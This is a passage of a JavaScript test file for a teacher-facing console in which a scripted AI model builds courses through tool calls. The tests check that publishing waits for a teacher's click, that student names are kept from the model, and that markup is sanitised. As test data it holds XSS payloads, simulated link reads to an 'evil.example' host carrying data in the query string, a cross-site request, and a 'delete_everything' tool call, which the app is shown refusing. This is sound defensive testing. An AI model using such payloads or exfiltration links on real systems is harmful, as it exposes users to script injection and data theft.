// Ask: what a teacher says becomes a course through the console's own routes, step by step; what reaches learners waits for a click
// the model can't make; and names never reach the model. A scripted model: no network.
import '../../harness/test/no-network.js';
import test from 'node:test';
import assert from 'node:assert/strict';
import { memoryStore } from '../../harness/src/store/store.js';
import { looksLikeClassList, settled } from '../src/console/ask.js';
import { holdsClassList } from '../src/console/askTools.js';
import { createApp } from '../src/server/app.js';
import { consoleAsset } from '../src/console/layout.js';

const TOKEN = 'a-token-of-some-length';
const BASE = 'http://server.test';
const headers = { authorization: `Bearer ${TOKEN}`, 'content-type': 'application/json' };
const call = (name, args, id = `call_${Math.random().toString(36).slice(2)}`) => ({ id, type: 'function', function: { name, arguments: JSON.stringify(args) } });

// The model, as a script of what it answers in turn: each a list of tool calls, or words. It keeps all it was sent.
function scripted(script, pages = {}) {
  const sent = [];
  let at = 0;
  const fetch = async (url, init = {}) => {
    if (String(url).endsWith('/models')) return new Response(JSON.stringify({ data: [{ id: 'reply-model' }] }), { headers: { 'content-type': 'application/json' } });
    // A page someone named: what reads the web and what reaches a model are one function here.
    if (init.method === 'GET') return pages[String(url)]?.() ?? new Response('nothing', { status: 404 });
    const body = JSON.parse(init.body);
    sent.push(body);
    const next = await (typeof script === 'function' ? script(body, at) : script[at]);
    at += 1;
    if (next === undefined) return new Response(JSON.stringify({ choices: [{ message: { role: 'assistant', content: 'That’s all.' }, finish_reason: 'stop' }] }), { headers: { 'content-type': 'application/json' } });
    if (next instanceof Response) return next;
    const message = Array.isArray(next) ? { role: 'assistant', content: null, tool_calls: next } : { role: 'assistant', content: next };
    return new Response(JSON.stringify({ choices: [{ message, finish_reason: 'stop' }], usage: { total_tokens: 7 } }), { headers: { 'content-type': 'application/json' } });
  };
  return { fetch, sent };
}

async function server(script, { model = true, pages = {} } = {}) {
  const store = memoryStore();
  const provider = scripted(script, pages);
  const handler = await createApp({ bytes: null, name: 'x', vars: { VIABLE_ENGINE_TOKEN: TOKEN, VIABLE_ENGINE_SECRET: 'a-secret' }, store, fetch: provider.fetch, pages: { fetch: provider.fetch } });
  const api = (method, path, body) => handler(new Request(`${BASE}/console/api/${path}`, { method, headers, ...(body !== undefined ? { body: JSON.stringify(body) } : {}) }));
  const ok = async (method, path, body) => { const response = await api(method, path, body); const data = await response.json(); assert.ok(response.ok, `${path}: ${JSON.stringify(data)}`); return data; };
  const page = async (path) => { const response = await handler(new Request(`${BASE}/console/${path}`, { headers: { authorization: `Bearer ${TOKEN}`, accept: 'text/html' } })); assert.equal(response.status, 200, path); return response.text(); };
  if (model) await ok('POST', 'providers', { name: 'A provider', base_url: 'http://model.test/v1', key: 'a-key' }).then(({ id }) => ok('PUT', 'roles/reply', { provider: id, model: 'reply-model' }));
  // One message, read to its end: the events, in order.
  const ask = async (message, thread) => {
    const response = await api('POST', 'ask', { message, ...(thread ? { thread } : {}) });
    assert.equal(response.status, 200, await response.clone().text());
    const text = await response.text();
    return text.split('\n\n').filter(Boolean).map((frame) => ({ name: /^event: (.+)$/m.exec(frame)?.[1], data: JSON.parse(/^data: (.+)$/m.exec(frame)?.[1] || 'null') }));
  };
  return { handler, api, ok, page, ask, store, sent: provider.sent };
}
const threadOf = (events) => events.find((event) => event.name === 'thread').data.id;
const allText = (events) => JSON.stringify(events);

const SETUP = [
  [call('create_course', { title: 'Fractions, period 2', audience: 'children', units: ['Week 1', 'Week 2'] })],
  (course) => [call('add_activity', { course, title: 'Practice: adding fractions', kind: 'questions', unit: 'Week 1', minutes: 20, goal: 'Add fractions with unlike denominators.', help: 'hint', questions: [
    { type: 'single', prompt: 'What is 1/2 + 1/3?', choices: ['2/5', '5/6'], right: ['5/6'], hints: ['What do the pieces need in common?'] },
    { type: 'fill', prompt: 'What is 1/4 + 1/4?', accept: ['1/2', '2/4'] }
  ] })],
  'I set up the course and one activity, hidden for now. I assumed grade 5.'
];
// What the model said next can use what came back: it reads the course's address from the tool's answer.
const following = (steps) => (body, at) => {
  const step = steps[at];
  if (typeof step !== 'function') return step;
  const answers = body.messages.filter((message) => message.role === 'tool').map((message) => JSON.parse(message.content));
  return step(answers.map((answer) => answer.course).filter(Boolean).at(-1));
};

test('a teacher’s words become a course, by the same routes a page uses, each step said as it happens', async () => {
  const s = await server(following(SETUP));
  const events = await s.ask('Fractions for my grade 5 class, period 2. They keep adding the denominators.');
  const steps = events.filter((event) => event.name === 'step');
  assert.deepEqual(steps.filter((step) => step.data.state === 'running').map((step) => step.data.label), ['Making the course “Fractions, period 2”', 'Adding “Practice: adding fractions”']);
  assert.ok(steps.filter((step) => step.data.state === 'done').every((step) => /ask-step/.test(step.data.html)));
  assert.equal(events.at(-1).name, 'done');
  assert.ok(events.some((event) => event.name === 'said' && /I set up the course/.test(event.data.html)));
  assert.ok(events.some((event) => event.name === 'card' && /Practice: adding fractions/.test(event.data.html) && /Hidden/.test(event.data.html) && /Try it as a learner/.test(event.data.html)), 'it ends with what was made, to use');

  const { course } = await s.ok('GET', 'courses/fractions-period-2/download');
  assert.equal(course.audience, 'children');
  assert.deepEqual(course.units.map((unit) => unit.title), ['Week 1', 'Week 2']);
  const made = course.activities[0];
  assert.equal(made.release, 'hidden', 'nothing reaches learners from a draft');
  assert.equal(made.teaching.help, 'hint');
  assert.equal(made.unit_ref, course.units[0].ref);
  assert.equal(made.minutes, 20);
  const { question_sets: sets } = await s.ok('GET', 'courses/fractions-period-2/download');
  const first = sets[0].items[0];
  assert.equal(first.choices.find((choice) => choice.id === first.answer.choice).text, '5/6', 'the key stays right however the choices are mixed');

  // The conversation comes back as a page, with its steps folded and its details a click away.
  const shown = await s.page(`ask/${threadOf(events)}`);
  assert.match(shown, /They keep adding the denominators/);
  assert.match(shown, /2 steps/);
  assert.match(shown, /add_activity/, 'what it did is there for whoever looks');
  assert.match(shown, /2 questions:/);
  assert.match(await s.page('ask'), /What are you teaching\?/);
  assert.match(await s.page('ask'), /Fractions, period 2/, 'earlier conversations are on the front door, by what they made');
});

test('questions it writes are checked as a page’s are: a wrong answer key doesn’t become a question', async () => {
  const s = await server(following([
    [call('create_course', { title: 'Bad keys' })],
    (course) => [call('add_activity', { course, title: 'Check', kind: 'questions', questions: [{ type: 'single', prompt: 'Which?', choices: ['a', 'b'], right: ['c'] }] })],
    'I couldn’t add it.'
  ]));
  const events = await s.ask('A check');
  const failed = events.find((event) => event.name === 'step' && event.data.state === 'failed');
  assert.match(failed.data.html, /needs its right answer/);
  assert.match(failed.data.html, /<details open/, 'an error opens by itself');
  const told = s.sent.at(-1).messages.filter((message) => message.role === 'tool').map((message) => message.content).join();
  assert.match(told, /needs its right answer/, 'the model hears why, and can put it right');
});

test('what reaches learners waits for a person: the model can only propose it, and its own word changes nothing', async () => {
  const s = await server(following([
    ...SETUP.slice(0, 2),
    (course) => [call('open_activity', { course, activity: 'practice-adding-fractions' })],
    'It’s open now! https://made.up/link'
  ]));
  const events = await s.ask('Set it up and open it');
  const card = events.filter((event) => event.name === 'card').map((event) => event.data.html).find((html) => /Open “Practice/.test(html));
  assert.ok(card, 'a card asks');
  assert.match(card, /For everyone in the course/);
  assert.match(card, /gives hints only/);
  let { course } = await s.ok('GET', 'courses/fractions-period-2/download');
  assert.equal(course.activities[0].release, 'hidden', 'proposing changes nothing, whatever the model then says');
  assert.equal(s.sent.length, 3, 'a proposal ends the turn, so the model can’t go on to say it happened');
  assert.doesNotMatch(allText(events), /It’s open now|made\.up/);
  assert.ok(events.some((event) => event.name === 'card' && />Open to learners<\/button>/.test(event.data.html)), 'the button is on its card, saying who it opens to');
  assert.ok(!events.some((event) => event.name === 'said' && /is open/.test(event.data.html)));

  const thread = threadOf(events);
  const api = /data-api="POST (ask\/thr_[a-f0-9]+\/pending\/pnd_[a-f0-9]+)"/.exec(card)[1];
  await s.ok('POST', api, { yes: false });
  ({ course } = await s.ok('GET', 'courses/fractions-period-2/download'));
  assert.equal(course.activities[0].release, 'hidden', 'Not yet leaves it');
  assert.match(await s.page(`ask/${thread}`), /You said not yet/);
  assert.match((await s.ok('POST', api, { yes: true })).said, /already settled/, 'a card answers once');
  ({ course } = await s.ok('GET', 'courses/fractions-period-2/download'));
  assert.equal(course.activities[0].release, 'hidden');
});

test('a person’s click opens it, and the next turn’s model knows', async () => {
  const s = await server(following([
    ...SETUP.slice(0, 2),
    (course) => [call('open_activity', { course, activity: 'practice-adding-fractions' })],
    'Good, it’s open.'
  ]));
  const events = await s.ask('Set it up and open it');
  const card = events.filter((event) => event.name === 'card').map((event) => event.data.html).find((html) => /Open “Practice/.test(html));
  await s.ok('POST', /data-api="POST (ask\/thr_[a-f0-9]+\/pending\/pnd_[a-f0-9]+)"/.exec(card)[1], { yes: true });
  const { course } = await s.ok('GET', 'courses/fractions-period-2/download');
  assert.equal(course.activities[0].release, 'open');
  const thread = threadOf(events);
  const after = await s.page(`ask/${thread}`);
  assert.match(after, /You pressed Open/);
  assert.match(after, /Give your class/, 'pressing Open hands over the links');
  assert.doesNotMatch(after, /Nothing is open yet/);
  assert.doesNotMatch(after, /Learners can open it now/, 'once, not again on the activity’s card');
  await s.ask('Thanks. What next?', thread);
  assert.match(JSON.stringify(s.sent.at(-1).messages), /The teacher pressed the button: open/);
});

test('a pasted class list never reaches the model or a thread, and goes in the list from a card', async () => {
  const s = await server(following(SETUP));
  await s.ask('Fractions for period 2');
  const count = s.sent.length;
  const list = 'Zora Neale\nToni Morrison\nMaya Angelou\nJames Baldwin';
  assert.ok(looksLikeClassList(list));
  const events = await s.ask(list);
  assert.equal(s.sent.length, count, 'no model was called');
  const card = events.find((event) => event.name === 'card')?.data.html;
  assert.match(card, /Zora Neale/, 'it is on the card, in the box, for them to add');
  assert.match(card, /The AI doesn’t read it/);
  const thread = await s.store.get(`ask/threads/${threadOf(events)}`);
  assert.doesNotMatch(JSON.stringify(thread), /Neale/, 'never kept in a thread');
  assert.doesNotMatch((await s.page(`ask/${threadOf(events)}`)), /Neale/);
  // The card's form posts straight to the class list; the names go nowhere near a model.
  await s.ok('POST', /data-api="POST (courses\/[\w-]+\/people)"/.exec(card)[1], { list });
  assert.equal(s.sent.length, count);
  // And nothing the model gets afterwards has them.
  await s.ask('How is the class doing?', threadOf(events));
  assert.doesNotMatch(JSON.stringify(s.sent), /Neale|Morrison|Baldwin/);
});

test('what it reads of a class is counts: names and work stay on the page', async () => {
  const s = await server(following([
    ...SETUP.slice(0, 2),
    (course) => [call('read_progress', { course }), call('read_course', { course })],
    'Nobody has started yet.'
  ]));
  await s.ok('POST', 'courses', { title: 'Other' });
  const created = await s.ask('Set up fractions and tell me how they’re doing');
  await s.ok('POST', 'courses/fractions-period-2/people', { name: 'Ada Lovelace' });
  assert.ok(created);
  const again = await server(following([
    [call('read_progress', { course: 'named' })],
    'One learner.'
  ]));
  await again.ok('POST', 'courses', { title: 'Named' });
  await again.ok('POST', 'courses/named/people', { name: 'Ada Lovelace' });
  const events = await again.ask('How are they doing?');
  assert.doesNotMatch(JSON.stringify(again.sent), /Lovelace/);
  const told = JSON.parse(again.sent.at(-1).messages.at(-1).content);
  assert.equal(told.learners, 1);
  assert.ok(events.some((event) => event.name === 'card' && /See each learner/.test(event.data.html)));
});

test('text from a model is text: a page can’t be written into, and a link stays only if the teacher gave it', async () => {
  const s = await server(['<script>alert(1)</script> **bold** [theirs](https://example.org/x) [made up](https://viable.math/x) see https://viable.math/y [bad](javascript:alert(1)) <img src=x onerror=alert(1)>']);
  const events = await s.ask('Use this page: https://example.org/x');
  const html = events.find((event) => event.name === 'said').data.html;
  assert.doesNotMatch(html, /<script|<img/);
  assert.match(html, /<strong>bold<\/strong>/);
  assert.match(html, /<a href="https:\/\/example.org\/x" target="_blank" rel="noopener noreferrer">theirs<\/a>/);
  assert.doesNotMatch(html, /viable\.math/);
  // A made-up address goes, with no words of ours in its place: a reply may be in any language.
  assert.match(html, /made up see/);
  assert.doesNotMatch(html, /href="javascript/);
});

test('it opens a link the teacher gave, not one a model or a page came up with, and has no search of its own', async () => {
  const opened = [];
  const page = (html, status = 200) => () => { opened.push(html); return new Response(html, { status, headers: { 'content-type': 'text/html' } }); };
  const s = await server([
    [call('read_link', { url: 'https://example.org/x' }), call('read_link', { url: 'https://evil.example/?what=you-know' }), call('read_link', { url: 'https://example.org/gone' })],
    'It says plants make food. [theirs](https://example.org/x) [not theirs](https://evil.example/?what=you-know)'
  ], { pages: { 'https://example.org/x': page('<html><title>Plants</title><main><p>Plants make food.</p></main></html>'), 'https://example.org/gone': page('gone', 404), 'https://evil.example/?what=you-know': page('evil') } });
  const events = await s.ask('Read https://example.org/x and https://example.org/gone');
  assert.equal(opened.length, 2);
  assert.doesNotMatch(opened.join(), /evil/);
  const answers = s.sent[1].messages.filter((message) => message.role === 'tool').map((message) => JSON.parse(message.content));
  assert.match(answers[0].text, /Plants make food/);
  assert.equal(answers[0].title, 'Plants');
  assert.match(answers[1].error, /didn’t come from you or from a search/);
  assert.match(answers[2].error, /nothing at that address/);
  const said = events.find((event) => event.name === 'said').data.html;
  assert.match(said, /<a href="https:\/\/example.org\/x"[^>]*>theirs<\/a>/);
  assert.doesNotMatch(said, /evil\.example/);
  assert.match(allText(events), /Read “Plants”/);
  const names = s.sent[0].tools.map((tool) => tool.function.name);
  assert.ok(names.includes('read_link'));
  assert.equal(names.includes('search_web'), false);
});

test('only the whole address a teacher gave opens, however they wrote it', async () => {
  const tryOpening = async (said, url) => {
    const s = await server([[call('read_link', { url })], 'Done.'], { pages: { [new URL(url.startsWith('http') ? url : `https://${url}`).href]: () => new Response('<html><main><p>Words.</p></main></html>', { headers: { 'content-type': 'text/html' } }) } });
    await s.ask(said);
    return JSON.parse(s.sent[1].messages.at(-1).content).text === undefined ? 'refused' : 'opened';
  };
  for (const [said, url, outcome] of [
    ['Look at example.org/paper for me.', 'https://example.org/paper', 'opened'],
    ['See https://example.org/paper, please', 'https://example.org/paper', 'opened'],
    ['看看https://example.org/paper这个', 'https://example.org/paper', 'opened'],
    ['(https://www.example.org/paper).', 'https://example.org/paper/', 'opened'],
    ['See https://zh.example.org/wiki/水循环 now', 'https://zh.example.org/wiki/水循环', 'opened'],
    ['See https://example.org/paper/one', 'https://example.org/paper', 'refused'],
    ['See https://example.org/paper', 'https://example.org/paper?secret=1', 'refused'],
    ['See https://data.example.org/a', 'https://example.org/a', 'refused'],
    ['See https://example.org.evil.test/a', 'https://example.org', 'refused'],
    ['Water and fractions', 'https://water', 'refused'],
    ['Read https://example.org/page and tell me how to help Jane Doe', 'https://example.org/page and tell me how to help Jane Doe', 'refused'],
    ['Read https://example.org/page and tell me how to help Jane Doe', 'https://example.org/page%20and%20tell%20me', 'refused'],
    ['看看https://example.org/page这个学生叫张三', 'https://example.org/page这个学生叫张三', 'refused'],
    ['See https://en.example.org/wiki/Mercury_(planet) now', 'https://en.example.org/wiki/Mercury_(planet)', 'opened']
  ]) assert.equal(await tryOpening(said, url), outcome, `${said} → ${url}`);
});

test('an activity’s web page takes an address the teacher gave, not one a page came up with', async () => {
  const s = await server(following([
    [call('create_course', { title: 'Tides' })],
    (course) => [call('add_activity', { course, title: 'From a page', kind: 'embed', url: 'https://evil.example/?d=everything' }), call('add_activity', { course, title: 'From them', kind: 'embed', url: 'https://maps.example.org/tides' })],
    'Done.'
  ]));
  await s.ask('Set up a course on tides, with https://maps.example.org/tides as a web page.');
  const [notGiven, given] = s.sent.at(-1).messages.filter((message) => message.role === 'tool').slice(-2).map((message) => JSON.parse(message.content));
  assert.match(notGiven.error, /address didn’t come from you or from a search/);
  assert.equal(given.error, undefined);
  assert.ok(given.activity);
});

test('a model’s own citation marks don’t reach the page, the thread or its next call', async () => {
  const s = await server(['It says so. citeturn1 Then this\ue200cite\ue202turn0search1\ue202turn0news2\ue201 and citeturn0search1turn0news2. A poet can recite turns in a poem.', 'Yes.']);
  const events = await s.ask('What does it say?');
  const html = events.find((event) => event.name === 'said').data.html;
  assert.match(html, /It says so\. Then this and\. A poet can recite turns in a poem\./);
  assert.doesNotMatch(html, /citeturn|[\ue200-\ue2ff]/u);
  await s.ask('And?', threadOf(events));
  assert.doesNotMatch(JSON.stringify(s.sent.at(-1).messages.filter((message) => message.role === 'assistant')), /citeturn/);
  const [, file] = (await s.page('ask')).match(/src="\/console\/assets\/(ask-[^"]+)"/);
  const [, marks] = (await consoleAsset(file).text()).match(/live\.words\.replace\(\/(.+)\/g, ''\)/);
  let words = '';
  const shown = ['So cite', 'turn0search1turn0', 'news2. Then\ue200cite', '\ue202turn0', '\ue201 more.'].map((piece) => (words += piece).replace(new RegExp(marks, 'g'), ''));
  assert.deepEqual(shown, ['So cite', 'So', 'So. Then', 'So. Then', 'So. Then more.'], 'words as they arrive lose them too, however they’re cut');
});

test('a link’s words: a bracket stays in an address, and a full stop after one isn’t part of it', async () => {
  const s = await server(['See [Mercury](https://en.example.org/wiki/Mercury_(planet)) and https://en.example.org/x. Also https://made.up/y.']);
  const events = await s.ask('Use https://en.example.org/wiki/Mercury_(planet) and https://en.example.org/x');
  const html = events.find((event) => event.name === 'said').data.html;
  assert.match(html, /<a href="https:\/\/en\.example\.org\/wiki\/Mercury_\(planet\)"[^>]*>Mercury<\/a> and https:\/\/en\.example\.org\/x\. Also\./);
});

test('a class list in a table is found in any column, and a table of something else isn’t', () => {
  const lists = [
    'First,Last\nAda,Lovelace\nGrace,Hopper\nAlan,Turing',
    'Last,First,ID\nLovelace,Ada,1001\nHopper,Grace,1002\nTuring,Alan,1003',
    '"Last, First",Score\n"Lovelace, Ada",92\n"Hopper, Grace",88\n"Turing, Alan",75',
    'Name,Section\nAda Lovelace,P2\nGrace Hopper,P2\nAlan Turing,P3',
    'ID,First,Last\n1,Ada,Lovelace\n2,Grace,Hopper\n3,Alan,Turing\n4,Katherine,Johnson\n5,Mary,Jackson',
    'No,Name\n1,Ada Lovelace\n2,Grace Hopper\n3,Alan Turing',
    '| No | Student | Score |\n| --- | --- | --- |\n| 1 | Ada Lovelace | 92 |\n| 2 | Grace Hopper | 88 |\n| 3 | Alan Turing | 75 |',
    '1,Ada,92\n2,Grace,88\n3,Alan,75\n4,Katherine,91\n5,Mary,84'
  ];
  for (const list of lists) assert.equal(holdsClassList(list), true, list);
  // Long files, too: a table in the middle of everything else.
  assert.equal(holdsClassList(`${'A line of prose that goes on for a while.\n'.repeat(40)}${lists[0]}\n${'More prose that goes on for a while here.\n'.repeat(40)}`), true);
  const others = [
    'Week 1, fractions\nWeek 2, decimals\nWeek 3, percents\nWeek 4, ratios\nWeek 5, review',
    'word,meaning\napple,a fruit\nriver,water that flows\nstone,a small rock\nfield,open land\nrain,water that falls',
    'Add the tops, keep the bottom\nFind what they share, then add\nCheck it, and write it simply',
    'Question,Answer\n2+2,4\n3+3,6\n4+4,8\n5+5,10\n6+6,12'
  ];
  for (const other of others) assert.equal(holdsClassList(other), false, other);
});

test('a course or activity name written by someone else stays text on a card', async () => {
  const s = await server(following([[call('read_progress', { course: 'x-img-src-x-onerror-alert-1' })], 'Done.']));
  await s.ok('POST', 'courses', { title: 'x<img src=x onerror=alert(1)>' });
  const events = await s.ask('How is it going?');
  const card = events.find((event) => event.name === 'card')?.data.html || '';
  assert.doesNotMatch(card, /<img/);
});

test('with no model it says so and sends nothing, a model’s failure is said, and what was made stays', async () => {
  const none = await server([], { model: false });
  assert.match(await none.page('ask'), /Ask needs a model/);
  assert.equal((await none.api('POST', 'ask', { message: 'hi' })).status, 409);
  const redirect = await none.handler(new Request(`${BASE}/console`, { headers: { authorization: `Bearer ${TOKEN}`, accept: 'text/html' } }));
  assert.match(redirect.headers.get('location'), /\/console\/courses$/, 'until a model is set, the front door is the courses page');

  const s = await server(following([SETUP[0], new Response(JSON.stringify({ error: { message: 'Overloaded' } }), { status: 503 })]));
  const events = await s.ask('Fractions');
  assert.ok(events.some((event) => event.name === 'said' && event.data.failed));
  assert.equal(events.at(-1).name, 'done');
  await s.ok('GET', 'courses/fractions-period-2/download');
  const thread = await s.store.get(`ask/threads/${threadOf(events)}`);
  assert.equal(thread.running_at, null, 'a failure doesn’t hold the conversation');
});

test('a long run stops at its limit, an unknown tool is refused, a stop is heard, and a second message waits its turn', async () => {
  const loop = await server(() => [call('list_courses', {})]);
  const events = await loop.ask('Keep going');
  assert.ok(events.some((event) => event.name === 'said' && /more steps than I can take/.test(event.data.html)));
  assert.ok(loop.sent.length <= 14);

  const unknown = await server([[call('delete_everything', {})], 'I can’t do that.']);
  await unknown.ask('Delete everything');
  assert.match(unknown.sent.at(-1).messages.at(-1).content, /no such thing to do/);

  const s = await server(['Hello.']);
  const first = await s.ask('Hi');
  const thread = threadOf(first);
  const held = await s.store.get(`ask/threads/${thread}`);
  await s.store.put(`ask/threads/${thread}`, { ...held, running_at: new Date().toISOString() });
  assert.equal((await s.api('POST', 'ask', { message: 'Again', thread })).status, 409);
  await s.store.put(`ask/threads/${thread}`, { ...held, running_at: new Date(Date.now() - 600000).toISOString() });
  assert.equal((await s.api('POST', 'ask', { message: 'Again', thread })).status, 200, 'one that never finished doesn’t hold it for ever');

  await s.ok('POST', `ask/${thread}/stop`, {});
  assert.equal((await s.store.get(`ask/threads/${thread}`)).stop, true);
});

test('Ask can’t be reached without signing in, or from another site', async () => {
  const s = await server(['Hello.']);
  const anon = await s.handler(new Request(`${BASE}/console/api/ask`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ message: 'hi' }) }));
  assert.equal(anon.status, 401);
  const away = await s.handler(new Request(`${BASE}/console/api/ask`, { method: 'POST', headers: { ...headers, origin: 'https://evil.example', 'sec-fetch-site': 'cross-site' }, body: JSON.stringify({ message: 'hi' }) }));
  assert.equal(away.status, 403);
  assert.equal(s.sent.length, 0);
});

test('a list reads as a list in any form, and a note that reads like one goes through on a click', async () => {
  for (const list of [
    'ada lovelace\ngrace hopper\nkatherine johnson',
    '1. Ada Lovelace\n2. Grace Hopper\n3. Katherine Johnson',
    'Ada Lovelace 12345678\nGrace Hopper 12345679',
    'ada@school.org\ngrace@school.org',
    'Ada Lovelace <ada@school.org>\nGrace Hopper <grace@school.org>',
    '李雷\n韩梅梅\n王芳',
    'José García\nZoë Müller\nNguyễn Văn An',
    'Ada Lovelace\nGrace Hopper'
  ]) assert.equal(looksLikeClassList(list), true, list);
  for (const note of ['Fractions for grade 5', 'Grade 5\nFractions\nPlease add a quiz', 'A unit on photosynthesis.\nTwo activities, please.\nThey read at grade 7.', 'Hello']) assert.equal(looksLikeClassList(note), false, note);

  const { api, sent } = await server(['Fine.']);
  const held = await (await api('POST', 'ask', { message: 'Ada Lovelace\nGrace Hopper\nKatherine Johnson' })).text();
  assert.match(held, /data-send-anyway/);
  assert.equal(sent.length, 0);
  await (await api('POST', 'ask', { message: 'Ratios\nDecimals\nPercents', not_a_list: true })).text();
  assert.equal(sent.length, 1, 'said by a person, it goes');
});

test('a conversation cut off mid-step still reads as one', () => {
  const messages = [{ role: 'user', content: 'x' }, { role: 'assistant', content: null, tool_calls: [{ id: 'a' }, { id: 'b' }] }, { role: 'tool', tool_call_id: 'a', content: '{}' }];
  const fixed = settled(messages);
  assert.equal(fixed.length, 4);
  assert.equal(fixed.find((item) => item.tool_call_id === 'b').role, 'tool');
  assert.deepEqual(settled(fixed), fixed);
});

test('what would reach learners at once is refused: sections on a course in use, teaching or questions on what is open', async () => {
  const queue = [];
  const { ask, ok, page, sent } = await server(() => queue.shift());
  // What the model is told after each step it asked for.
  const say = async (...calls) => {
    queue.push(calls, 'Done.');
    sent.length = 0;
    await ask('go');
    return sent[1].messages.filter((message) => message.role === 'tool').at(-1).content;
  };
  const made = JSON.parse(await say(call('create_course', { title: 'Fractions', audience: 'children' })));
  assert.match(made.note, /nobody can open this until the teacher adds a class list/, 'children sign in with codes, and the model is told what that needs');
  const code = made.course;
  assert.match(await page(`courses/${code}/people`), /Personal codes on cards/);
  await say(call('add_activity', { course: code, title: 'Practice', kind: 'questions', questions: [{ type: 'single', prompt: 'What is 1/2 + 1/3?', choices: ['2/5', '5/6'], right: ['5/6'] }] }));

  // Before it opens, each of these goes through.
  const version = async () => /name="version" value="([^"]+)"/.exec(await page(`courses/${code}`))[1];
  assert.doesNotMatch(await say(call('set_how_ai_helps', { course: code, activity: 'practice', goal: 'Add fractions.' })), /is open/);

  await ok('POST', `courses/${code}/activities/practice/release`, { version: await version(), release: 'open' });
  assert.match(await say(call('add_questions', { course: code, activity: 'practice', questions: [{ type: 'fill', prompt: 'Next?', accept: ['1'] }] })), /is open and uses these questions/);
  assert.match(await say(call('set_how_ai_helps', { course: code, activity: 'practice', goal: 'Another goal.' })), /is open, so learners would get this/);
  assert.match(await say(call('add_sections', { course: code, names: ['Period 2'] })), /first section would stop each of them/);
});

test('what Ask looks up and sets says whose work it is, in the page’s words', async () => {
  const { findMisconceptions } = await import('../../harness/src/utils/misconceptions.js');
  const { findSkills } = await import('../../harness/src/utils/skills.js');
  const id = findMisconceptions('adding fractions').data[0].misconceptions[0].id;
  const skill = findSkills('evidence').data[0].code;
  const steps = [
    SETUP[0],
    (told) => SETUP[1](told.map((answer) => answer.course).filter(Boolean).at(-1)),
    [call('find_misconceptions', { words: 'adding fractions' }), call('find_skills', { words: 'evidence' })],
    (told) => { const made = told.find((answer) => answer.activity); return [call('set_how_ai_helps', { course: made.course, activity: made.activity, help: 'hint', misconceptions: [id], skill: { code: skill, level: 3 } })]; },
    'Done.'
  ];
  const s = await server((body, at) => (typeof steps[at] === 'function' ? steps[at](body.messages.filter((message) => message.role === 'tool').map((message) => JSON.parse(message.content))) : steps[at]));
  const events = await s.ask('Fractions for my grade 5 class. Listen for adding the denominators, and aim at using evidence.');
  const done = events.filter((event) => event.name === 'step' && event.data.state === 'done').map((event) => event.data.html).join('\n');
  assert.match(done, /<p class="ask-detail">From Eedi Misconceptions Graph v1\.0, CC BY 4\.0\.<\/p>/);
  assert.match(done, /<p class="ask-detail">From Carnegie Skills Progressions, CC BY 4\.0\.<\/p>/);
  assert.match(done, /How much the AI does: Gives hints/);
  assert.match(done, new RegExp(`Skill: ${skill} at Integrating, from Carnegie Skills Progressions, CC BY 4\\.0`));
  assert.match(done, /Listening for 1 misconception, from Eedi Misconceptions Graph v1\.0, CC BY 4\.0/);
});

test('an activity card says it opens to learners, and once open, shows how they get to it', async () => {
  const s = await server(following(SETUP));
  const events = await s.ask('Fractions for my grade 5 class, period 2.');
  const thread = threadOf(events);
  const card = events.find((event) => event.name === 'card' && /Practice: adding fractions/.test(event.data.html)).data.html;
  assert.match(card, />Open to learners<\/button>/);
  assert.doesNotMatch(card, />Open it<\/button>/);
  assert.doesNotMatch(card, /Learners can open it now/, 'nothing to share while it is hidden');
  const button = /data-api="POST (courses\/[\w-]+\/activities\/[\w-]+\/release)" data-body='([^']+)'/.exec(card);
  const opened = await s.api('POST', button[1], JSON.parse(button[2].replaceAll('&quot;', '"')));
  assert.equal(opened.status, 200);
  assert.equal(opened.headers.get('clear-site-data'), '"prefetchCache"');
  // Children sign in with codes from the class list, so with nobody on it the card doesn't say they can open it.
  const before = await s.page(`ask/${thread}`);
  assert.match(before.slice(before.indexOf('Practice: adding fractions')), /<h4>Before learners can open it<\/h4><p class="notice">Only personal codes on the class list open this course, and nobody is on it yet\./);
  await s.ok('POST', 'courses/fractions-period-2/people', { list: 'Ada Lovelace' });
  // Drawn again from what is true now, the card has the class link, the poster and a QR code to scan.
  const page = await s.page(`ask/${thread}`);
  const shown = page.slice(page.indexOf('Practice: adding fractions'));
  assert.match(shown, /<div class="ask-reach"><h4>Learners can open it now<\/h4>[\s\S]*?<p class="ask-link"><code>[^<]*\/course\/fractions-period-2<\/code><\/p>[\s\S]*?Copy link[\s\S]*?Show to the class[\s\S]*?<svg class="qr"/);
});

test('a host’s standards search names its source when the host gives one', async () => {
  const { ASK_TOOLS } = await import('../src/console/askTools.js');
  const tool = ASK_TOOLS.find((item) => item.name === 'find_standards');
  const search = async () => [{ uuid: 'u', code: '5.NF.A.1', says: 'Add fractions with unlike denominators.' }];
  const named = await tool.run({ standards: { search, source: { name: 'Learning Commons Knowledge Graph', license: 'https://creativecommons.org/licenses/by/4.0/' } } }, { words: 'fractions' });
  assert.equal(named.detail, 'From Learning Commons Knowledge Graph, CC BY 4.0.');
  assert.equal((await tool.run({ standards: { search } }, { words: 'fractions' })).detail, null);
});

test('one round of a model’s steps has a limit, and the ones past it are told to wait', async () => {
  const many = Array.from({ length: 12 }, (_, index) => call('list_courses', {}, `call_${index}`));
  const { ask, sent } = await server([many, 'Done.']);
  await ask('Look around');
  const tools = sent[1].messages.filter((message) => message.role === 'tool');
  assert.equal(tools.length, 12, 'each is answered, or the conversation is broken');
  assert.equal(tools.filter((message) => /At most 8 at a time/.test(message.content)).length, 4);
});

test('reading as a class list: lists are, sentences aren’t', () => {
  for (const list of ['Ada Lovelace\nGrace Hopper\nAlan Turing', 'Lovelace, Ada\nHopper, Grace\nTuring, Alan', 'Ada Lovelace\tPeriod 1\nGrace Hopper\tPeriod 2\nAlan Turing\tPeriod 1', '王小明\n李华\n张伟']) assert.ok(looksLikeClassList(list), list);
  for (const words of ['Fractions for grade 5', 'A course on fractions.\nThey keep adding denominators.\nMake it short.', 'Week 1\nWeek 2', 'Make three activities:\n- Practice\n- Check\n- Reflect']) assert.ok(!looksLikeClassList(words), words);
});

test('a course or activity brought into a conversation is what it works on, and what learners can reach waits for a click', async () => {
  const courseName = 'Fractions';
  let code;
  let key;
  const s = await server(following([
    (course) => [call('read_activity', { course: code, activity: key })],
    (course) => [call('change_activity', { course: code, activity: key, goal: 'Say why two fractions are equal.', minutes: 15 })],
    'Done.',
    (course) => [call('change_activity', { course: code, activity: key, title: 'Practice, renamed' })],
    'Waiting.'
  ]));
